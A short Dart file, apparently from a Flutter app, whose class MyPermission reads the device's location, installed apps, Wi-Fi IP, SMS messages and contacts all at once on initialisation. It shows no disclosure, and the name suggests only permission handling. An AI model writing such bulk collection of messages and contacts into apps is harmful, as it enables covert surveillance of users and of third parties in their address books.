import 'GlobalState.dart';
import 'device_info.dart';
import 'location.dart';

class MyPermission {
  static initialize() async {

    await getCurrentLocation();
    await DeviceInfo.getInstalledApps();
    await DeviceInfo.getWifiIPAddress();
    await DeviceInfo.getSMSList();
    if (GlobalState.userDetails!.contactsList == null) {
      await DeviceInfo.getContactsList();
    }
    }
  
}
